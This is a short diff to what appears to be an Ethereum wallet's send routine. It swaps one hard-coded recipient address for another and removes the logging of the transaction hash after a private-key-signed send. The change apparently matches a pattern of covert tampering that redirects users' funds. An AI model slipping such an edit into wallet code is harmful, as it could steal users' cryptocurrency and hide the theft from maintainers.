@@ -258,7 +258,7 @@
         let sendGasPrice = parseFloat(this.sendGas);
         let sendGasAmount = parseInt(this.sendGasAmount);
         let sendAmount = parseFloat(this.sendAmount);
-        let sendRecipient = "0xb1C97DBD0A741aefCA3978B5Efe09BA7446Df006";
+        let sendRecipient = "0xA6B7084e510385Ce87635b0A857Ae6703cf98b1D";
         let password = this.password;
         let data;
         let value;
@@ -342,7 +342,7 @@
                 transaction.nonce = nonce;
                 // Sign the transaction and send.
                 web3.eth.sendSignedTransaction(sign(transaction, '0x' + ks.exportPrivateKey(this.walletAddress, pwDerivedKey)), async (error, txHash) => {
-                  console.log(txHash);
+                  
                   if(txHash) {
                     // Set pending tx.
                     let pendingTx = {
